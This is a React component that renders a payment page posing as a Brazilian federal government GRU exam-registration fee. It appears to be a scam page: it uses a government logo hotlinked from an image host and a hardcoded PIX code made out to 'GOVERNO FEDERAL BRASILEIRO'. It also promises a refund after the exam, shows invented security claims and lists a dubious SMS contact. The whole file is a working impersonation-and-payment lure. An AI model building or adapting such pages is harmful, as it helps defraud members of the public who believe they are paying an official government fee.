import React, { useState } from 'react';
import { useUser } from '../context/UserContext';

const PIX_CODE =
  '00020101021226880014br.gov.bcb.pix2566qrcode.banco.central.com.br/pix/2b87be2c-1b33-47bc-93a9-a426a47651005204000053039865802BR5924GOVERNO FEDERAL BRASILEIRO 62070503***6304C574';

const PagamentoGRU: React.FC = () => {
  const { userData } = useUser();
  const [copied, setCopied] = useState(false);

  const firstName = userData?.nome
    ? userData.nome.split(' ')[0].charAt(0).toUpperCase() + userData.nome.split(' ')[0].slice(1).toLowerCase()
    : 'Paciente';

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(PIX_CODE);
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    } catch {
      /* fallback – select text */
    }
  };

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-white" style={{ fontFamily: 'Rawline, Raleway, sans-serif' }}>
      {/* Header sticky */}
      <div className="sticky top-0 z-10 bg-white border-b border-gray-200">
        <div className="flex items-center justify-between p-4 md:p-6">
          <div className="flex items-center space-x-4">
            <img
              src="https://i.ibb.co/b53ZGM19/Logo-Governo-Federal-2019-2022-1-removebg-preview.png"
              alt="Governo Federal"
              className="h-10 md:h-12 w-auto"
            />
            <div>
              <h1 className="text-xl md:text-2xl font-semibold text-gray-900" style={{ fontSize: 14 }}>
                Guia de Recolhimento da União
              </h1>
            </div>
          </div>
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 p-6 md:p-8 lg:p-12">
        <div className="max-w-5xl mx-auto">
          {/* Heading */}
          <div className="text-center mb-8 md:mb-12">
            <h2 className="text-2xl md:text-3xl font-light text-gray-900 mb-2">
              {firstName}, finalize sua inscrição
            </h2>
            <p className="text-gray-600">Última etapa para confirmar sua participação</p>
          </div>

          {/* Two-column grid */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-16">
            {/* LEFT COLUMN */}
            <div className="space-y-8">
              {/* Total */}
              <div className="text-center">
                <p className="text-sm text-gray-500 mb-2">Total para quitação</p>
                <p className="text-5xl md:text-6xl font-light text-gray-900 mb-1">R$ 59,75</p>
                <p className="text-sm text-gray-500">Quitação com Segurança Garantida.</p>
                <div className="mt-4 border-l-2 border-gray-300 pl-3 text-left max-w-sm mx-auto">
                  <p className="text-gray-700 text-xs font-medium mb-1">Garantia de comparecimento</p>
                  <p className="text-gray-600 text-xs">Valor devolvido integralmente após sua presença na prova</p>
                </div>
              </div>

              {/* QR Code */}
              <div className="flex justify-center">
                <div className="bg-gray-50 p-8 rounded-2xl">
                  <div className="w-64 h-64 md:w-80 md:h-80 bg-white rounded-xl flex items-center justify-center shadow-sm">
                    <img
                      src={`https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=${encodeURIComponent(PIX_CODE)}`}
                      alt="QR Code PIX"
                      className="w-full h-full object-contain p-4"
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* RIGHT COLUMN */}
            <div className="space-y-8">
              {/* PIX Code */}
              <div>
                <h3 className="text-lg font-medium text-gray-900 mb-4">Código PIX</h3>
                <div className="space-y-4">
                  <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                    <p className="text-xs font-mono text-gray-700 break-all leading-relaxed">
                      {PIX_CODE}
                    </p>
                  </div>
                  <button
                    onClick={handleCopy}
                    className="w-full py-4 text-base font-semibold rounded-lg transition-all duration-300 bg-[#1351B4] hover:bg-blue-700 text-white inline-flex items-center justify-center gap-2"
                  >
                    {copied ? (
                      <>
                        <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                        </svg>
                        <span>Código copiado!</span>
                      </>
                    ) : (
                      <>
                        <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <rect width="14" height="14" x="8" y="8" rx="2" ry="2" />
                          <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2" />
                        </svg>
                        <span>Copiar código PIX</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* Para onde vai essa taxa */}
              <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm">
                <h3 className="text-lg font-semibold text-[#1351B4] mb-4 flex items-center gap-2">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  Para onde vai essa taxa?
                </h3>
                <div className="space-y-4">
                  {/* Progress bars */}
                  <div className="space-y-3">
                    {[
                      { label: 'Custeio da Prova', pct: 40, color: 'blue' },
                      { label: 'Tecnologia do Sistema', pct: 30, color: 'green' },
                      { label: 'Auditoria e Segurança', pct: 30, color: 'orange' },
                    ].map((item) => (
                      <div key={item.label} className="flex items-center gap-3">
                        <div className={`w-4 h-4 bg-${item.color}-500 rounded`} />
                        <div className="flex-1">
                          <div className="flex justify-between items-center mb-1">
                            <span className="text-sm font-medium text-gray-700">{item.label}</span>
                            <span className={`text-sm font-bold text-${item.color}-600`}>{item.pct}%</span>
                          </div>
                          <div className="w-full bg-gray-200 rounded-full h-2">
                            <div className={`bg-${item.color}-500 h-2 rounded-full`} style={{ width: `${item.pct}%` }} />
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* Descriptions */}
                  <div className="space-y-3 text-xs text-gray-600 bg-gray-50 p-3 rounded-lg">
                    <div className="flex items-start gap-2">
                      <div className="w-2 h-2 bg-blue-500 rounded-full mt-1 flex-shrink-0" />
                      <p><strong>Custeio da Prova:</strong> Impressão, logística, aplicação e correção das provas em todo território nacional.</p>
                    </div>
                    <div className="flex items-start gap-2">
                      <div className="w-2 h-2 bg-green-500 rounded-full mt-1 flex-shrink-0" />
                      <p><strong>Tecnologia:</strong> Plataforma de inscrições, sistema de pagamentos e infraestrutura digital.</p>
                    </div>
                    <div className="flex items-start gap-2">
                      <div className="w-2 h-2 bg-orange-500 rounded-full mt-1 flex-shrink-0" />
                      <p><strong>Auditoria:</strong> Fiscalização, conformidade LGPD e validação de processos seletivos.</p>
                    </div>
                  </div>
                </div>
              </div>

              {/* How to pay */}
              <div>
                <h3 className="text-lg font-medium text-gray-900 mb-4">Como quitar</h3>
                <div className="space-y-3">
                  {[
                    'Abra seu aplicativo bancário',
                    'Acesse a área PIX',
                    'Escaneie o QR Code ou cole o código',
                    'Confirme a quitação',
                  ].map((text, i) => (
                    <div key={i} className="flex items-center text-gray-700">
                      <span className="w-6 h-6 bg-[#1351B4] text-white rounded-full flex items-center justify-center text-sm font-medium mr-3">
                        {i + 1}
                      </span>
                      {text}
                    </div>
                  ))}
                  <div className="flex items-center text-gray-700">
                    <span className="w-6 h-6 bg-green-600 text-white rounded-full flex items-center justify-center text-sm font-medium mr-3">
                      5
                    </span>
                    <span className="font-medium">Volte a esta página para confirmar sua inscrição</span>
                  </div>
                </div>
              </div>

              {/* Warning */}
              <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
                <div className="flex items-start gap-3">
                  <div className="flex-shrink-0 w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center">
                    <svg className="h-4 w-4 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="m12 19-7-7 7-7" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 12H5" />
                    </svg>
                  </div>
                  <div>
                    <h4 className="font-medium text-amber-800 text-sm mb-1">Importante: Volte após o pagamento</h4>
                    <p className="text-amber-700 text-xs leading-relaxed">
                      Após realizar o pagamento PIX no seu banco, retorne a esta página. A confirmação da sua inscrição será feita automaticamente assim que identificarmos o pagamento.
                    </p>
                  </div>
                </div>
              </div>

              {/* After payment */}
              <div className="bg-gray-50 p-6 rounded-lg">
                <h4 className="font-medium text-gray-900 mb-3">Após a quitação</h4>
                <p className="text-gray-600 text-sm leading-relaxed mb-3">
                  Seu protocolo será finalizado automaticamente. Você receberá confirmação com todas as informações necessárias para acompanhar o processo seletivo:
                </p>
                <div className="space-y-2 text-sm">
                  <div className="flex items-center text-gray-700">
                    <span className="font-medium text-gray-900 mr-2">SMS:</span>(11) 24414-141
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Footer */}
          <div className="text-center mt-12 pt-8 border-t border-gray-200">
            <div className="flex items-center justify-center mb-2">
              <svg className="w-4 h-4 text-gray-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z" />
              </svg>
              <span className="text-sm text-gray-500">Quitação segura</span>
            </div>
            <p className="text-xs text-gray-400 mb-4">Processado via sistema governamental • SSL • Dados criptografados</p>
            <button className="text-sm text-gray-500 hover:text-gray-700 px-4 py-2">
              Continuar após quitação
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PagamentoGRU;
